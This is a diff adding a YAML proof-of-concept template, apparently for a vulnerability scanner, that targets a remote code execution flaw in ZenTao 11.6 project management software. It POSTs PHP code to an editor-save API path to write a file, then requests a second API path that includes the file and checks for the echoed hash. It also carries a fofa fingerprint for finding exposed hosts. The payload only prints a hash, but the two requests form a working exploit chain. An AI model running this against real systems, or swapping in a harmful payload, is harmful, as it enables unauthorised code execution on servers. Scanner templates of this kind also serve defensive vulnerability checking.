@@ -1,0 +1,27 @@
+id: poc-yaml-zentao-editor-save-rce
+info:
+  name: 禅道 11.6 api-getModel-editor-save-filePath 远程代码执行
+  severity: critical
+  tags:
+  - rce
+  finger: 禅道项目管理系统
+  fofa: 禅道项目管理系统
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api-getModel-editor-save-filePath=1111
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: fileContent=<?php echo md5({{.t1}}); ?>
+  expression: "status_code == 200 &&\ncontains(body, \"\\\"status\\\":\\\"fail\\\"\
+    \") && \ncontains(body, \"\\\"md5\\\"\")\n"
+- method: GET
+  path: /api-getModel-api-getMethod-filePath=1111/1
+  expression: 'status_code == 500 &&
+
+    contains(body, t2)
+
+    '
+transport: http
